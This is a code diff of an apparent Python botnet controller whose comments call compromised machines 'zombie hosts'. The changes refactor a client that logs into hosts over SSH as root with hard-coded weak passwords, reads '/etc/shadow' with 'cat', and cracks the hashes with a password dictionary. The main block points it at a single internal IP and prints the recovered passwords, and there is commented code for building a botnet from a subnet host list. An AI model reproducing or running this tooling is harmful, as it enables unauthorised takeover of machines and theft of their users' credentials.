@@ -189,18 +189,27 @@ class BotClient:
 
         return self.connected
 
-    def get_unix_passwdfile(self):
-        """获取密码文件
+    def get_passwd(self):
+        """获取unix密码文件
+            由于self.session连接在子线程中为断开状态 只能先获取文件内容再传输
 
-        :return: 密码文件内容
+        :return:
         """
         cmd_getpass = 'cat /etc/shadow'
         passwd_file_info = self.send_command(cmd_getpass)
         return passwd_file_info
 
-    def crack_unix_passwd(self, passwd_file_info):
-        self.password_json = bruteUnixPasswd.crack_bot_unix_passwd(ip=self.host, passwd_file_info=passwd_file_info,
-                                                                   dic=gv.PASS_DICTIONARY)
+    def crack_passwd(self, passwd_file_info):
+        """破解密码
+
+        :param passwd_file_info:
+        :return:
+        """
+        if passwd_file_info not in ['', None]:
+            self.password_json = bruteUnixPasswd.crack_bot_unix_passwd(ip=self.host, passwd_file_info=passwd_file_info,
+                                                                       dic=gv.PASS_DICTIONARY)
+        else:
+            print('[-] Get unix password file failed.')
 
     def standard_operate(self):
         """肉鸡标准操作
@@ -210,9 +219,8 @@ class BotClient:
         if self.connected is False:
             return
 
-        # 获取unix密码
-        passwd_file_info = self.get_unix_passwdfile()
-        t = threading.Thread(target=self.crack_unix_passwd, args=(passwd_file_info,))
+        # 破解unix密码
+        t = threading.Thread(target=self.crack_passwd, args=(self.get_passwd(),))
 
         self.close()
         t.start()
@@ -300,20 +308,20 @@ def main():
 
 
 if __name__ == "__main__":
-    net = BotNet()
-    net.buildnet_by_file('/root/h/data/hData/bot/10.108.36.71mask16.txt')
+    # net = BotNet()
+    # net.buildnet_by_file('/root/h/data/hData/bot/10.108.36.71mask16.txt')
     # net.add_bot(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
     # net.add_bot(**{'host': '10.108.103.215', 'user': 'root', 'key': '123456789'})
-    print(net)
+    # print(net)
     # net.net_connect()
     # net.operate_onebyone()
     # net.net_close()
 
-    # client = BotClient(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
-    # client.connect()
-    # print(client.connected)
+    client = BotClient(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
+    client.connect()
+    client.standard_operate()
+    print(client.password_json)
     # client.com_ssh_realtime()
-    # client.close()
-    # print(client.connected)
+    client.close()
 
     # main()
